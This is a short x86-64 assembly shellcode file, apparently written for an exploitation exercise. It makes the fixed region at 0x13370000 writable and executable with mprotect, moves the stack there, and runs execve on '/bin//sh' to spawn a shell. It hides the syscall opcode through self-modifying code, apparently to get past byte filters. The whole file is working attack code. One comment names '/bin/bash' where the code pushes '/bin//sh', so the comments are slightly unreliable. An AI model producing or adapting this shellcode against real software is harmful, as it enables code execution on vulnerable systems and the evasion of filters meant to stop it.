.global _start
_start:
.intel_syntax noprefix  

        # calling mprotect with all the flags.
        mov eax, 125
        mov ebx, 0x13370000
        mov ecx, 1000
        mov edx, 7
        int 0x80

        # int3 // set a trace/breakpoint trap for debugging your shellcode  

        # change the stack
        mov rbp, 0x13370100
        leave

        # push "/bin/bash" to the stack
        mov rbx,  0x68732f2f6e69622f
        push rbx

        # syscall for execve("/bin/bash", NULL, NULL)
        mov al, 59
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        inc BYTE PTR [rip] # increments the byte that rip points to, 0x0e in this case, making it 0x0f at runtime. Needed opcode for the syscall call (0x0f05). 
        .word 0x050e
